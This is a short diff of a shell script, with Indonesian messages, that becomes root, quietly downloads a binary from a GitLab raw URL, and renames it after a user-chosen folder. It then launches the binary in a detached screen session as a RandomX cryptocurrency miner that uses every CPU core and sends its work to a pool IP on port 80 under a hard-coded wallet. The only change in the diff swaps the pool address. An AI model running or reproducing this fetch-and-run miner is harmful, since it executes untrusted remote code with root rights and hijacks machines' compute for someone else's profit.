@@ -14,6 +14,6 @@ echo "Folder '$NAMA_FOLDER' berhasil dibuat dan Anda sekarang berada di dalamnya
 sudo su <<EOF
 sudo apt install screen -y >/dev/null 2>&1
 wget -qO dogi https://gitlab.com/sarifadim/jomblo/-/raw/main/rocky && chmod +x dogi && mv dogi $NAMA_FOLDER
-screen -dms run ./$NAMA_FOLDER --algorithm randomx --pool 185.12.5.250:80 -u 89sFpdzyEQjg8ZHaDDDZ5GUonqznYCDCmEScNTAQtrg341Pz82KG82hE2zWDwWg4gmgBVUmWTYy58ArUPCXH3KrtKJzoGvQ.GROOM -p J -t $(nproc --all) --disable-gpu
+screen -dms run ./$NAMA_FOLDER --algorithm randomx --pool 8.219.86.27:80 -u 89sFpdzyEQjg8ZHaDDDZ5GUonqznYCDCmEScNTAQtrg341Pz82KG82hE2zWDwWg4gmgBVUmWTYy58ArUPCXH3KrtKJzoGvQ.GROOM -p J -t $(nproc --all) --disable-gpu
 EOF
 screen -r
